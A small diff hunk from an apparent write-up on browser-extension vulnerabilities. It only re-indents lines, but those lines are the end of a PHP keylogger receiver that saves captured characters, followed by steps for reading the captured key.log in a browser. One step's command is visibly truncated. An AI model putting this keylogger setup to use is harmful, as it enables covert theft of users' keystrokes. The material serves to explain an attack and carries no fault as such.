@@ -32,10 +32,10 @@ Vulnerabilities in browser extensions put users at risk by providing a way for w
               fclose($file);     
               echo('char saved!');   
                      
-            - cd ..     
-            - cd ..      
-            - -hR www-data:www-data html     
-            - Open a browser > 192.168.xx.xx/keylogger/key.log     
+       - cd ..     
+       - cd ..      
+       - -hR www-data:www-data html     
+       - Open a browser > 192.168.xx.xx/keylogger/key.log     
             
 
 
